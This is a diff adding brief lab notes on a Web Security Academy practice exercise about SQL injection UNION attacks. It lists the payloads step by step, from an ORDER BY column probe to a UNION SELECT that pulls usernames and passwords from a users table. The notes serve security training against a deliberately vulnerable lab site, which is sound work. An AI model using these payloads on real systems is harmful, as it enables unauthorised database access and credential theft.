@@ -1,0 +1,12 @@
+Lab #05: SQL injection UNION attack, retrieving data from other tables
+
+Finding the number of column using order by
+' order by 2--
+https://0a7400cd045d76b2807a7198009e00d5.web-security-academy.net/filter?category=Lifestyle' order by 2--
+
+Finding the column containing the text
+' union select   NULL,NULL--
+' union select 'a','b'--
+
+Finding the all usernames and passwords from the table users
+' union select username,password from users--
